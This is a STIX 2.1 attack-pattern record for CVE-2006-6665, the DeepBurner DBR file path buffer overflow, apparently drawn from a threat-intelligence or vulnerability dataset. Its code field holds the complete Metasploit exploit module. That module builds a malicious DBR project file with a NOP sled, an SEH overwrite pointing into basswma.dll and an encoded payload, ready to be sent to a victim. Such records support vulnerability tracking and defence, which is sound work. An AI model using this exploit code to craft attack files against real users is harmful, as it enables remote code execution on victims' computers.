{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d52e91b-e04f-4d7c-acc2-3c3ed544440d",
    "created": "2024-08-14T16:38:20.561233Z",
    "modified": "2024-08-14T16:38:20.561237Z",
    "name": "AstonSoft DeepBurner (DBR File) Path Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in versions 1.9.0.228 1.8.0, and possibly other versions of AstonSoft's DeepBurner (Pro, Lite, etc). An attacker must send the file to victim and the victim must open the file. Alternatively it may be possible to execute code remotely via an embedded DBR file within a browser, since the DBR extension is registered to DeepBurner.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/deepburner_path.rb",
            "external_id": "deepburner_path.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6665"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AstonSoft DeepBurner (DBR File) Path Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in versions 1.9.0.228,\n        1.8.0, and possibly other versions of AstonSoft's DeepBurner (Pro, Lite, etc).\n        An attacker must send the file to victim and the victim must open the file.\n        Alternatively it may be possible to execute code remotely via an embedded\n        DBR file within a browser, since the DBR extension is registered to DeepBurner.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t =>\n        [\n          'Expanders',  # original discovery (2006)\n          'fl0 fl0w',   # re-discovered 2009/2010\n          'jduck'       # metasploit version\n        ],\n      'References'     =>\n        [\n          [ 'BID', '21657' ],\n          [ 'OSVDB', '32356' ],\n          [ 'CVE', '2006-6665' ],\n          [ 'EDB', '2950' ],\n          [ 'EDB', '8335' ],\n          [ 'EDB', '11315' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n          'DisableNops' => true\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x101021f8 } ], # p/p/r - basswma.dll v2.2.0.3 (seems to be packed)\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-12-19',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.dbr']),\n      ])\n  end\n\n  def exploit\n\n    template = <<-EOS\n<DeepBurner_record ver=\"1.9.0.228\" type=\"data\">\n<data_cd ver=\"1\" device=\"\" session2import=\"0\" finalize_disc=\"0\" finalize_track=\"1\" bootable=\"0\" boot_image_path=\"\">\n<dir name=\"CDRoot\" imp=\"0\">\n<file name=\"map_fear_drives.bat\" path=\"REPLACE_ME\" imp=\"0\" />\n</dir>\n</data_cd>\n<cd_label ver=\"1\" zoom=\"0\" view=\"label\" layout=\"standart\">\n<label />\n<front />\n<back />\n</cd_label>\n<autorun ver=\"1\" use=\"0\">\n<main name=\"MainForm\" image_path=\"\" hint=\"\" />\n<title name=\"Title\" text=\"Title\" hint=\"Title box\" left=\"144\" top=\"48\" width=\"57\" height=\"33\" fontname=\"Times New Roman\" fontsize=\"20\" fontcolor=\"255\" visible=\"1\" fontstyle=\"0\" />\n<comment name=\"Comments\" text=\"Comment\" hint=\"Comment box\" left=\"40\" top=\"76\" width=\"89\" height=\"29\" fontname=\"Times New Roman\" fontsize=\"15\" fontcolor=\"255\" visible=\"1\" fontstyle=\"0\" />\n<exitbutton name=\"ButtonExit\" image_path=\"\" image_down_path=\"\" text=\"Exit\" hint=\"Exit this program\" left=\"120\" top=\"96\" width=\"75\" height=\"25\" fontname=\"MS Sans Serif\" fontsize=\"8\" fontcolor=\"255\" visible=\"1\" fontstyle=\"0\" />\n</autorun>\n</DeepBurner_record>\nEOS\n\n    seh_offset = 272\n    path = make_nops(seh_offset)\n    path << generate_seh_record(target.ret)\n    path << payload.encoded\n    path << rand_text_alphanumeric(1000) * 20\n    path = xml_encode(path)\n\n    sploit = template.gsub(/REPLACE_ME/, path)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n\n  end\n\n  def xml_encode(str)\n    ret = \"\"\n    str.unpack('C*').each { |ch|\n      case ch\n      when 0x41..0x5a, 0x61..0x7a, 0x30..0x39\n        ret << ch.chr\n      else\n        ret << \"&#x\"\n        ret << ch.chr.unpack('H*')[0]\n        ret << \";\"\n      end\n    }\n    ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-12-19",
    "x_mitre_platforms": [
        "win'"
    ]
}